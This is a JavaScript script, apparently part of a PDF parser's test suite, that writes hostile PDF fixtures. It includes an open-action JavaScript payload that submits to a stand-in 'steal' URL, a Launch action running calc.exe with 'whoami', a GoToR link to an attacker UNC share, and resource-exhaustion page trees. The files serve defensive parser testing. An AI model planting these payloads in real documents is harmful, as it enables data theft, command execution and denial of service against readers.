import { mkdir, writeFile } from 'node:fs/promises';
import { URL } from 'node:url';
import { HELVETICA, pdf, stream, textPage } from '../corpus/pdf-writer.mjs';

// Hostile PDFs: JavaScript open action, launch and remote actions, an xref loop, a 100,000-page
// tree built from shared nodes, and a page tree nested 2,000 deep. None may run, fetch or hang.
const directory = new URL('../../hostile/pdf/', import.meta.url);
await mkdir(directory, { recursive: true });

// One unused malformed kid rejects during prefetch, before the caller can observe its promise (#206).
await writeFile(
  new URL('unused-malformed-page-kid.pdf', directory),
  pdf(
    [
      '<< /Type /Catalog /Pages 2 0 R >>',
      '<< /Type /Pages /Kids [3 0 R 4 0 R] /Count 1 >>',
      '<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>',
      '<< /Type /Page /Bad ) >>',
    ],
    '/Root 1 0 R',
  ),
);

const page = (parent, contents, extra = '') =>
  `<< /Type /Page /Parent ${parent} 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 3 0 R >> >> /Contents ${contents} 0 R${extra} >>`;

// 1 catalog with a JavaScript open action and document-level JavaScript.
await writeFile(
  new URL('openaction-javascript.pdf', directory),
  pdf(
    [
      '<< /Type /Catalog /Pages 2 0 R /OpenAction 6 0 R /Names << /JavaScript << /Names [(init) 7 0 R] >> >> >>',
      '<< /Type /Pages /Kids [4 0 R] /Count 1 >>',
      HELVETICA,
      page(2, 5, ' /AA << /O 6 0 R >>'),
      stream(textPage(['Opening this file must not run anything.'])),
      "<< /S /JavaScript /JS (app.alert('run'); this.submitForm('https://example.invalid/steal');) >>",
      "<< /S /JavaScript /JS (app.launchURL('https://example.invalid/', true);) >>",
    ],
    '/Root 1 0 R',
  ),
);

// Launch and GoToR actions on links: reported, never followed.
await writeFile(
  new URL('launch-and-remote.pdf', directory),
  pdf(
    [
      '<< /Type /Catalog /Pages 2 0 R >>',
      '<< /Type /Pages /Kids [4 0 R] /Count 1 >>',
      HELVETICA,
      page(2, 5, ' /Annots [6 0 R 7 0 R]'),
      stream(textPage(['Launch a program', 'Open a remote file'])),
      '<< /Type /Annot /Subtype /Link /Rect [70 755 300 775] /A << /S /Launch /F (C:\\\\Windows\\\\System32\\\\calc.exe) /Win << /F (calc.exe) /P (/c whoami) >> >> >>',
      '<< /Type /Annot /Subtype /Link /Rect [70 739 300 759] /A << /S /GoToR /F (\\\\\\\\attacker.invalid\\\\share\\\\doc.pdf) /D [0 /Fit] >> >>',
    ],
    '/Root 1 0 R',
  ),
);

// The trailer's /Prev points at its own cross-reference section.
await writeFile(
  new URL('xref-loop.pdf', directory),
  pdf(
    [
      '<< /Type /Catalog /Pages 2 0 R >>',
      '<< /Type /Pages /Kids [4 0 R] /Count 1 >>',
      HELVETICA,
      page(2, 5),
      stream(textPage(['A trailer that points at itself.'])),
    ],
    '/Root 1 0 R',
    { prevSelf: true },
  ),
);

// 100,000 pages from five levels of shared /Pages nodes, each with ten references to the next.
{
  const levels = 5;
  const objects = ['<< /Type /Catalog /Pages 2 0 R >>'];
  // Objects 2..6 are the five levels; 7 font, 8 page, 9 contents.
  for (let level = 0; level < levels; level++) {
    const self = 2 + level;
    const child = level === levels - 1 ? 8 : self + 1;
    const count = 10 ** (levels - level);
    const parent = level === 0 ? '' : ` /Parent ${self - 1} 0 R`;
    objects.push(
      `<< /Type /Pages${parent} /Kids [${Array.from({ length: 10 }, () => `${child} 0 R`).join(' ')}] /Count ${count} >>`,
    );
  }
  objects.push(HELVETICA);
  objects.push(
    '<< /Type /Page /Parent 6 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 7 0 R >> >> /Contents 9 0 R >>',
  );
  objects.push(stream(textPage(['One page object, shared 100,000 times.'])));
  await writeFile(new URL('pages-100000-shared.pdf', directory), pdf(objects, '/Root 1 0 R'));
}

// A page tree nested 2,000 deep with one page at the bottom.
{
  const depth = 2_000;
  const objects = ['<< /Type /Catalog /Pages 2 0 R >>'];
  for (let level = 0; level < depth; level++) {
    const self = 2 + level;
    const kid = level === depth - 1 ? depth + 3 : self + 1;
    const parent = level === 0 ? '' : ` /Parent ${self - 1} 0 R`;
    objects.push(`<< /Type /Pages${parent} /Kids [${kid} 0 R] /Count 1 >>`);
  }
  objects.push(HELVETICA); // object depth + 2
  objects.push(
    `<< /Type /Page /Parent ${depth + 1} 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 ${depth + 2} 0 R >> >> /Contents ${depth + 4} 0 R >>`,
  );
  objects.push(stream(textPage(['At the bottom of a deep page tree.'])));
  await writeFile(new URL('deep-page-tree-2000.pdf', directory), pdf(objects, '/Root 1 0 R'));
}
